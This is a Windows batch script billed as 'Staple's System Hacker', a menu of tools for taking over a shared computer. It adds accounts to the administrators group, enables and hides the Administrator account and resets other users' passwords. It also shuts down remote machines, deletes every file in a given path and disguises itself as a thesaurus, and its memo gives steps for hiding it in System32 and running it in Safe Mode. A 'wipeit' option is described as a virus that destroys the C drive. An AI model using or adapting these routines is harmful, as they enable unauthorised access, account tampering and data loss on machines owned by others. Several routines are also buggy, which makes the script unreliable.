@echo off
:d
set /p a= Password
if %a%== withgreatpowercomesgreatresponsibility goto intro
if %a%== sos goto virus
if not %a%== withgreatpowercomesgreatresponsibility goto b
:b
shutdown -s -t 60
set /p b= ! > nul
if %b%== eggs goto c
if not eggs exit
:c
shutdown -a
goto d
:intro
echo Welcome to Staple's System Hacker V 1.0
pause >nul
:intro
echo READ INFORMATION AND LIST OF COMMAND FIRST. ALL OF THESE TOOLS ARE TO BE USED   RESPONISIBLY AND LEGALLY, STAPLES DOES NOT TAKE ANY RESPONISIBILTY FOR THE USE OF THIS PROGRAM.Note also that not all programs may be in working order for all systems, but I'm pretty sure I got around stupid Microsoft's new safeguards. If you get System 5 error has occured, it'll take a special bit of hacking to get around the Administrators security, type memo for more info. If this doesn't work, you can probably find software to change the pass and get in online. 
pause >nul
echo I set the password for this program the way it is for a reason, use this wisely. Do nothing you don't think you, as a Christian, shouldn't. That said, have fun! = )
pause >nul
goto a
:a
set /p command= Type your command here, list for commands, info-(command) for info on command/ instructions.
if %command%== list goto list
if %command%== wipeit goto wipeit
if %command%== ips goto ips
if %command%== password goto passwords
if %command%== info-wipeit goto info-wipeit
if %command%== info-ips goto info-ips
if %command%== info-password goto info-passwords
if %command%== d goto disguise-word
if %command%== info-d goto info-d
if %command%== shutdown shutdown -s -t 00
if %command%== info-shutdown goto info-shutdown
if %command%== cmd goto cmd
if %command%== info-cmd goto info-cmd
if %command%== filewipe goto filewipe
if %command%== info-filewipe goto info-filewipe
if %command%== internet goto internet
if %command%== info-internet goto info-internet
if %command%== siteunblock goto webunblock
if %command%== info-siteunblock goto info-siteunblock
if %command%== remoteshutdown goto remoteshutdown
if %command%== accountmodify goto pass2
if %command%== info-remoteshutdown goto info-remoteshutdown
if %command%== info-accountmodify goto info-accountmodify
if %command%== createadmin goto creatadmin
if %command%== info-createadmin goto info-createadmin
if %command%== msgsend goto msgsend
if %command%== info-msgsend goto info-msgsend
if %command%== newuser goto newuser
if %command%== info-newuser goto info-newuser
if %command%== info-memo echo Special Hacking instructions.
if %command%== memo goto memo
if %command%== activateadmin goto activateadmin
if %command%== hideadmin goto hide admin
if %command%== info-activateadmin goto info-activateadmin
if %command%== info-hideadmin goto info-hideadmin
if %command%== hideaccount goto hideaccount
if %command%== info-hideaccount goto info-hideaccount
if %command%== actaccount goto actaccount
if %command%== info-actaccount goto info-actaccount

goto a

:list
echo wipeit-Virus designed to delete all data on a computer, not tested and it's so simple  i doubt it will work or it'll be picked up by an antivirus. But at the very least it'll probably delete system32 and SERIOUSLY screw up the computer
echo ips- a scanner designed to find and trace ip addresses
echo password- gives access to all login passwords in this computer and gives ablity to change them
echo d- disguises program as a Thesaurus
echo shutdown- shuts down computer with no countdown, any unsaved data will be gone
echo cmd- starts a regular cmd shell, it'll be useless unless you know how to use it
echo siteunblock- let's you use restricted websites
echo remoteshutdown- allows u to remotely shutdown an account in this network
echo accountmodify- allows u to modfy user accounts, passwords, privledges, etc. Usually only Administrators can use it, but worth a try
echo createadmin- This is used to create a new account with unlimited access privledges.
echo msgsend- sends a text message to all or one of the people in a network
echo memo- how to hack the puter to use this with unlimited access and to the fullest extent.
echo activateadmin- mainly put this in for vista, since that ones ALOT harder to hack. Should activate the admin account on this computer, will do nothing for you if it's already active.
echo hideadmin- deactivates admin account so you can hide it
echo hideaccount- deactivates any account so you can hide it, put this in so you can hide accounts you created or mess with people by only allowing ur account to show up on the puter at start up
echo filewipe- deletes a entire folder full of files.
echo actaccount- opposite of above, activates accounts you've hidden
pause > nul                                                                                
echo note that if you fail to type withgreatpowercomesgreatresponsibility as the password, eggs will stop the computer shutdown, sos trigers a virus so DON't TYPE THAT!!!
pause > nul     
echo type the command with dash info be4 it for instructions and details
goto a

:info-passwords
echo This program allows you to either a) view or b) change all the passwords in this computer. In the view mode the usernames are given, then you select one. It should show a bunch of info and the password somewhere, but it doesn't always work. In the change mode you are required to type in the username, hit enter, then type the new password.
goto a

:wipeit
set /p mainpasscode= DEADLY! DESIGNED TO NOT BE ABLE TO BE STOPPED OR RECOVERED! DO NOT USE UNLESS UNDER EXTREAM EMERGENCY! This is untested, as i've obviously never tried it Passcode:
if %mainpasscode%== sos goto virus
goto a
:virus
shutdown -s

:info-wipeit
echo THIS IS A DEADLY VIRUS! I DO NOT EXPECT IT EVER TO BE USED, HOWEVER IN TODAYS DAY AND AGE YOU NEVER KNOW. IT IS DESIGNED (though untested) TO DELETE FIRST SYSTEM32 THEN WINDOWS AND THE ENTIRE C DRIVE, RECOVERY DRIVE AND SHUT IT DOWN TO MAKE THE DAMAGE PERNAMENT! I ALSO PUT TWO COMPUTER CRASHERS IN THERE, SO I"M FAIRLY SURE IT WILL AT LEAST DO SOME DAMAGE. AS I SAID IT'S UNTESTED SO NO PROMISES. YOU'll NEED THE SECOND PASSCODE, sos, TO GET IN I'M NOT TAKING ANY CHANCES, ENTER THE SAME PASSCODE AT BOOTUP FOR A QUICK WAY TO DO IT.
goto a

:ips
set /p form= url or currentnet?
set /p net= Start internet? (required for best results on currentnet) y/n
if %net%== y goto internet
if %net%== n goto lala
echo yes or no moron!
goto ips

:lala
if %form%== url goto url
if %form%== currentnet goto currentnet
echo u typed something wrong
goto a

:currentnet 
netstat -n
goto a

:url
set /p adress= What is the web address?
tracert %adress%
goto a

:internet
set /p service= aol or internet explorer?
if %service% ==aol goto aol
if %service% ==internet explorer goto explorer
if not %service% == aol goto no service
if not %service% == internet explorer goto no service
goto a

:aol
set /p website= website?
start aol.exe %website%
goto lala

:explorer
set /p website= website?
start iexplore.exe %website%
goto lala

:no service
echo either you typed something wrong, or this computer has no internet.
pause >nul
goto lala

:info-ips
echo these programs either trace the ip of a website or those using a network related to you (alot of the time when your chatting with them) When chatting with someone continuely scan with current net for established connections to find someone specific. You can trace someone's location at ip-address.com DO NOT USE FOR ILLEGAL PURPOSES, USE WISELY, DO NOT INVADE PEOPLES PRIVACY!
pause >nul
goto a

:disguise-word
cls
title Thesaurus
echo Synonyms for strong
echo Adjective
echo 1. strong (vs. weak), beardown(prenominal), beefed-up, brawny, hefty, muscular, 
echo powerful, sinewy, bullnecked, bullocky, fortified, hard, knockout, severe, 
echo industrial-strength, weapons-grade, ironlike, knock-down(prenominal), powerful, 
echo noticeable, reinforced, strengthened, robust, stiff, vehement, virile, well-knit, 
echo well-set, powerful, robust, rugged, tough, toughened 
echo usage: having strength or power greater than average or expected; "a strong radio echo signal"; "strong medicine"; "a strong man" 
echo 2. accented, heavy, strong, stressed (vs. unstressed) 
echo usage: used of syllables or musical beats 
echo 3. strong, intense (vs. mild) 
echo usage: not faint or feeble; "a strong odor of burning rubber" 
echo 4. potent, strong, powerful (vs. powerless) 
echo usage: having or wielding force or authority; "providing the ground soldier with echo increasingly potent weapons" 
echo 5. potent (vs. impotent), strong, effectual, equipotent, multipotent, effective#1, echo effectual#2, efficacious, fertile, powerful 
echo usage: having a strong physiological or chemical effect; "a potent toxin"; "potent echo liquor"; "a potent cup of tea" 
echo 6. impregnable, inviolable, secure, strong, unassailable, unattackable, invulnerable echo (vs. vulnerable) 
echo usage: able to withstand attack; "an impregnable fortress"; "fortifications that made echo the frontier inviolable" 
echo 7. solid, strong, substantial, sound (vs. unsound) 
echo usage: of good quality and condition; solidly built; "a solid foundation"; "several echo substantial timber buildings" 
echo 8. strong, irregular (vs. regular) 
echo usage: of verbs not having standard (or regular) inflection; "`sing' is a strong verb" 
echo 9. hard, strong, alcoholic (vs. nonalcoholic) 
echo usage: having a high alcoholic content; "hard liquor" 
echo 10. strong, warm, fresh (vs. stale) 
echo usage: freshly made or left; "a warm trail"; "the scent is warm" 
echo 11. firm, strong, forceful (vs. forceless) 
echo usage: strong and sure; "a firm grasp"; "gave a strong pull on the rope" 
set /p ok= okay to reboot >nul
if %ok%== eggs goto a
if not %ok%== eggs exit

:info-d
echo disguises program as a Thesaurus and will only reboot on passcode "eggs" any other code will close it, if your workin in a public area, having Microsoft Word out would be a good idea to help with the inlusion
goto a

:info-shutdown
echo What does it sound like it does? Moron.
goto a

:cmd
command.com
exit

:info-cmd
echo this starts a regular cmd (command prompt) shell. I put this in here for harddrive modification if the Administrator locked it out. This is totally useless unless you have some knowledge of it, note that the program will take time to shutdown if u need a quick get away, ctrl + alt + del and "end now"
goto a

:filewipe
set /p filewipe= Type the name and location of the file you wish to clear:
cd %filewipe% 
del *
goto a

:info-filewipe
echo MAKE SURE YOU TYPE THE CORRECT PATH!!! If you don't, it will delete w/e system you're currently in, BAD! I put a yes/no delete this in there, so DOUBLE CHECK! u can probably get the file path in propierties or my computer, an example of a filepath is: C:\Documents and Settings\Owner\Cookies
goto a

:info-internet
echo I thought it'd be useful to give access to internet incase it was blocked. This program should start the internet and allow you to choose a website. Note that you need to type http://(something like youtube.com), http:// is required
goto a
 
:view
net user
set /p dollupofdaisy = Choose a User:
net user %dollupofdaisy% 
goto a

:webunblock
set /p site= What website are you looking to vist?
ping %site%
set /p site= Type those funny numbers that keep repeating exactly as they appear here:
start iexplore.exe %site%
goto a

:info-siteunblock
echo This looks up a sites web ip-address and prompts you to type it, then it opens it up with that ip-address through internet explorer 
goto a

:remoteshutdown
shutdown -i
goto a

:pass2
control userpasswords2
goto a

:info-remoteshutdown
echo this nifty little program will pull up a prompt to shutdown another user in the network ur currently in...fun : )
echo You'll need the computer/account name
goto a

:info-accountmodify
echo This is the control userpasswords2 prompt, here you'll be able to change account passwords and what kind of access they have... but most administrators block you from accessing it. : (
pause >nul
goto a

:Createadmin
set /p acc= What do you want the name of the new account to be?
net localgroup administrators %acc% /add
goto a

:msgsend
set /p many= Would you like to send message to all users or only one in paticular? (answer: one or all)
if %many%== one goto one
if %many%== all goto all
goto a

:one
set /p acname= What is the account name?
set /p msg= What is the message?
msg %acname% %msg%
goto a

:all
set /p msg= What is the message?
msg * %msg% 
goto a

:info-createadmin
echo this SHOULD create a totally new account on this computer with Administrator priveledges, logout and back in under it to use this new account.
goto a

:info-msgsend
echo this should send a message to either one single user or all the users on a network. You'll need either the account name or the computer name or both (I'm not completely sure). Experiment to see which works in your settings.
goto a

:passwords
set /p pass= would you like to change or view?
if %pass%== view view
if %pass%== change goto changepass
goto a

:changepass
set /p nameuser= what is the name of the user?
net user %nameuser% *
goto a

:newuser
set /p name= What do u want the account to be named as?
set /p password= What password would you like?
net user %name% %password% /add
goto a

:info-newuser
echo This will allow you to create a new user for easy access, but it's limited. Not all the crap the Admin can do.
goto a

:memo
echo Okay, Windows XP's safeguards are a bit beter, It took me awhile to figure out how to do this. First of all you need to edit this file and click "SAVE AS". To edit it, right click on the icon on this file. DO NOT TOUCH THE CODE!!! THAT IS ALL I HAD TO DO TO MAKE THIS PROGRAM WORK! WITHOUT IT YOU MIGHT SCREW UP THE COMPUTER OR THE PROGRAM!
echo ___________________________________________________________________________
echo Okay now, name it ssh.bat and put it under "ALL FILES" (NOT TEXT or .txt)
echo ___________________________________________________________________________
echo Now for the tricky part... goto the top and click drive C:\ (or Local Disk) now search for the folder named WINDOWS, double click on that one. Now you need to find System 32, double click and hit "save." DO NOT TOUCH ANYTHING IN THERE.
echo ____________________________________________________________________________
echo You just saved this program as a Command Prompt Command. If you don't know what that it is, don't worry. As this program is now saved and hidden on the computer you no longer need the disk if you have one, eat it.
echo ______________________________________________________________________________
echo now you must restart the computer and hit the F8 key rapidly to go into "Safe Mode" Run it as the Administrator. (The screen name will probably be called that, but if it's not and  you don't know who would be, pick the one named for a computer geek who'd be in charge or most-important-sounding and continue until you can run this without Access being denied.)
echo ______________________________________________________________________________
echo in the big black box type "ssh" this should bring up the program with unlimited access. 
echo ______________________________________________________________________________
echo Cheers! ~Staples
echo ______________________________________________________________________________
echo You'll want to memorize or at least know these instructions so you can save it properly, if you've already done that i can restart your computer for you.
pause > nul
set /p r= Restart? (y/n)
if %r%== y shutdown -r
goto a

:activateadmin
net user Administrator /active:yes
echo if that worked you should just have to log off and log back in as the admin for unlimited access.
goto a

:info-activateadmin
echo In Vista (mainly what this is for) you'll need to right click the command prompt and select "run as administrator" If they blocked this you'll probably have to boot the computer up with external softwear (a disk) I'd recomend the Trinity Resuce CD (google it, it's the first two that come up) It's a free download you can burn. Now if this does work, simply log out and log in as the administrator, remeber to hide it otherwise anyone else can use it.

:hideadmin
net user Administrator /active:no
echo account safely hidden on computer, you'll need to reactivate to use it again.
goto a

:info-hideadmin
echo this hides the admin account you enabled, you'll need to reactivate be4 you can log in as it again
goto a

:hideaccount
set /p hideit= Which account would you like to hide? (type whatuser? inorder to view all the users)
if %hideit%== whatuser? goto hidenaccount 
net user %hideit% /active:no
echo should now be hidden, log out and check to make sure
goto a

:hidenaccount
net user 
goto hideaccount

:info-hideaccount
echo This will disable an account on this computer so it is not avaliable at start up.
goto a

:actaccount
set /p hideit= Which account would you like to hide? (type whatuser? inorder to view all the users)
if %actit%== whatuser? goto activeaccount 
net user %actit% /active:yes
echo should now be active, log out and check to make sure
goto a

:activeaccount
net user 
goto hideaccount

:info-actaccount
echo Should unblock a hidden account for access.
goto a